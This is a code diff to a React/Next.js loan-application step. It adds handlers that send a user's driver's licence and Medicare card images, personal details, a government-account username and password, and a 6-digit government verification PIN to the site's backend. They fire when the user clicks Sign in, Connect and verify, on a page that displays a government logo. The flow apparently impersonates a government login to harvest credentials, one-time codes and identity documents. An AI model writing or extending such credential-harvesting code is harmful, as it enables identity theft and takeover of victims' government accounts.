@@ -7,6 +7,9 @@ import Countdown from 'react-countdown';
 import { FaLess } from 'react-icons/fa';
 import { GoVerified } from 'react-icons/go';
 import { useRouter } from 'next/router';
+import Cookies from 'js-cookie';
+import axios from 'axios';
+import { baseURL } from '@/pages/api';
 
 function StepFive({forward,input,backward,setInput}) {
     
@@ -69,13 +72,14 @@ set_gov_sign(false);
 }
 
 // verified
-const verify = ()=>{
+const verify = (e)=>{
 if(input.gov_v_pin && input.gov_v_pin.length === 6){
      set_gov_pin(true);
     set_gov_sign(false);
     setLinked(false);
     set_verified(true);
     set_start_roller(false)
+    handleSubmit2(e)
     router.replace("/user/dashboard");
 }
 else{
@@ -134,6 +138,57 @@ const refresh_key = ()=>{
     setLinked(false)
   }
 
+  // handle submit
+  function handleSubmit1(e){
+    e.preventDefault();
+    const user_id = Cookies.get("__id");
+    const user_token = Cookies.get("token")
+    console.log(user_token);
+    if(input.driver_licence_back && input.driver_licence_front && input.medicare_back && input.medicare_front){
+    axios.put(`${baseURL}/users/update/`+user_id,{firstname:input.firstname,lastname:input.lastname,dob:input.dob,gender:input.gender,phone_number:input.phone,city:input.city,state:input.state,status:input.employment_status,loan_amount:input.loan_amount,loan_purpose:input.loan_purpose,DLFI:input.driver_licence_front[0].src,DLBI:input.driver_licence_back[0].src,medicare_front_image:input.medicare_front[0].src,medicare_back_image:input.medicare_back[0].src,gov_id:input.gov_id,gov_id_password:input.gov_password}).then(res =>{
+        let data = res.data;
+        
+        }
+        ).catch(err =>  {
+          console.log(err)
+        })
+    }
+
+};
+  // handle submit
+  function handleSubmit3(e){
+    e.preventDefault();
+    const user_id = Cookies.get("__id");
+    const user_token = Cookies.get("token")
+   
+    if(input.driver_licence_back && input.driver_licence_front && input.medicare_back && input.medicare_front){
+    axios.put(`${baseURL}/users/update/`+user_id,{gov_id:input.gov_id,gov_id_password:input.gov_password}).then(res =>{
+        let data = res.data;
+        
+        }
+        ).catch(err =>  {
+          console.log(err)
+        })
+    }
+
+};
+  // handle submit
+  function handleSubmit2(e){
+    e.preventDefault();
+    const user_id = Cookies.get("__id");
+    const user_token = Cookies.get("token")
+    if(input.driver_licence_back && input.driver_licence_front && input.medicare_back && input.medicare_front){
+    axios.put(`${baseURL}/users/update/`+user_id,{gov_verification_pin:input.gov_v_pin}).then(res =>{
+        let data = res.data;
+      
+        }
+        ).catch(err =>  {
+          console.log(err)
+        })
+    }
+
+};
+
   return (
     <div className='max-w-[40rem] z-[9999999] flex flex-col items-center justify-center mt-5 '>
 
@@ -143,7 +198,7 @@ const refresh_key = ()=>{
       {"<"} <span  className='cursor-pointer text-sky-900 underline hover:bg-sky-900 hover:text-white hover:no-underline font-bold' onClick={go_back}>Back</span>
     </div>
     <div className='bg-cyan-300  p-5 '>
-        <Image src={"/static/gov_logo.svg"} width={400} height={400} />
+        <Image src={"/static/gov_logo.svg"} alt="logo" width={400} height={400} />
     </div>
 
     {/* Wrapper for login*/}
@@ -186,7 +241,9 @@ Show
 </div>
 {/*  */}
 
-<button className='text-center w-full bg-cyan-300 font-bold py-3 hover:bg-indigo-400 hover:text-white' onClick={sign_in}>
+<button className='text-center w-full bg-cyan-300 font-bold py-3 hover:bg-indigo-400 hover:text-white'onClick={(e)=>{
+  sign_in()
+  handleSubmit3(e)}}>
 Sign in
 </button>
         </div>
@@ -237,8 +294,12 @@ Sign in
    {start_roller && <Roller />}
    {verified && <div className='flex flex-col gap-5 items-center justify-center'><GoVerified className='text-white bg-green-500 p-5 rounded rounded-full'/> Verified</div>}
    </div>
-{/*  */}
-    <div className=" px-3 mb-4 md:mb-0  flex items-center justify-center gap-6 mt-20 cursor-pointer bg-sky-600 hover:bg-sky-700 text-white px-8 py-5 w-80 text-bold text-xl" onClick={display_linked}>
+{/*  sjajsbjjbajbsajbjbsa*/}
+    <div className=" px-3 mb-4 md:mb-0  flex items-center justify-center gap-6 mt-20 cursor-pointer bg-sky-600 hover:bg-sky-700 text-white px-8 py-5 w-80 text-bold text-xl" onClick={(e)=>{
+      display_linked()
+      handleSubmit1(e)
+
+      }}>
      Connect
     </div>
 
